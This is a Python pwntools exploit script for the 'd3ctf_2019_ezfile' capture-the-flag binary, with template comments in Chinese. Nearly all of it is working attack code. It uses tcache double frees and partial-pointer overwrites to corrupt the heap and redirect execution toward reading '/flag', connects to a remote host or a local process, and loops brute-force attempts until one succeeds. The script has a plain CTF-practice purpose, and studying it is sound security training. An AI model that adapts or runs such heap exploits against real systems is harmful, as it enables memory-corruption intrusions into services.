#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./d3ctf_2019_ezfile"                                   # 本地ELF
    pro_libc = "libc-2.27_64.so"       # Libc文件
    rem_libc = "libc-2.27_64.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)

def malloc(size,content):
    ru(">>")
    sl("1")
    ru(">>")
    sl(str(size))
    ru(">>")
    sd(content)

def delete(idx):
    ru(">>")
    sl("2")
    ru(">>")
    sl(str(idx))

def encrypt(idx,size,content):
    ru(">>")
    sl("3")
    ru(">>")
    sl(str(idx))
    ru(">>")
    sl(str(size))
    ru(">>")
    # debug()
    sd(content)

def exp():
    ru(":")
    sl("Du4t")
    malloc(0x18,'aa\n') # 0
    malloc(0x18,'bb\n') # 1
    malloc(0x18,'cc\n') # 2
    malloc(0x18,'dd\n') # 3
    malloc(0x18,'ee\n') # 4
    malloc(0x18,'ff\n') # 5
    
    delete(1)
    delete(0)
    delete(0)
    malloc(0x1,'\x60') # 0
    malloc(0x10,'aaa\n') # 6
    malloc(0x10,p64(0)+p64(0xa1)) # 7
    for i in range(8):
        delete(0)
    malloc(0x2,'\x70\xfa') # 7

    delete(2)
    delete(2)
    malloc(0x1,'\x70') # 2
    malloc(0x10,'aaa\n') # 8
    malloc(0x10,'aaaa\n') # 9
    malloc(0x1,p8(3))

    
    encrypt(0,0x6a,'/flag'.ljust(0x68,'\x00')+'\x47\x11')

    # malloc(0x10,p64(0)+p64(0x18)) # 9
    # malloc(0x10,'aaa\n') # 10
    # malloc(0x1,p8(3))
    # delete(0)
    # debug()
    # delete(2)
    # delete(2)
    # sh.interactive()
    # delete(1)

    # debug()
    # delete(6)
    # sh.interactive()




    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        while True:
            try:
                exp()
                sh.interactive()
            except:
                log.info("Exploit Fail...")
                sh.close()
                RemPro()
                exp()
    
    

